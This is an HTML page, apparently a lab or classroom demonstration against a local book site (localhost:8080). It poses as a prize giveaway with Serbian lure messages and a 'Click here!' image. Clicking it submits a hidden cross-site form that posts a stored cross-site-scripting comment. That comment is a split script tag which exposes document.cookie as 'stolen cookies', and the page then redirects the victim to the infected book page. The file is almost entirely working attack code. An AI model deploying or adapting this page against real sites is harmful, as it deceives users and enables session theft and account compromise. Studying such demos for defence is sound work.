<!DOCTYPE html>
<html>
    <head>
        <title>Prize</title>
    </head>

    <body>

        <div onclick="exploit()" style="cursor:pointer;text-align:center;">
            <img src="youwin.png" />
            <h1>Click here!</h1>
        </div>

        <script>
            function exploit() {
        
                alert("Čestitamo! Osvojili ste specijalno izdanje knjige Le Petit Prince!");
                alert("Nastavite dalje kako biste je preuzeli !");

                const maliciozni_komentar = '<scr' + 'ipt>alert("Ukradeni cookies: " + document.cookie)</scr' + 'ipt>';
                createAndSubmitForm(maliciozni_komentar);
            }

            function createAndSubmitForm(comment) {

                const form = document.createElement('form');
                form.method = 'POST';
                form.action = 'http://localhost:8080/comments';
                form.style.display = 'none';
                form.enctype = 'application/x-www-form-urlencoded';

                const bookIdInput = document.createElement('input');
                bookIdInput.type = 'hidden';
                bookIdInput.name = 'bookId';
                bookIdInput.value = '1';

                const commentInput = document.createElement('input');
                commentInput.type = 'hidden';
                commentInput.name = 'comment';
                commentInput.value = comment;

                form.appendChild(bookIdInput);
                form.appendChild(commentInput);
                
                document.body.appendChild(form);

                form.submit();
                
                setTimeout(function() {
                    alert("Idite na stranicu knjige http://localhost:8080/books?id=1 da vidite vašu nagradu.");
                    window.open('http://localhost:8080/books?id=1', '_self');
                }, 1000);
            }
        </script>
    </body>
</html>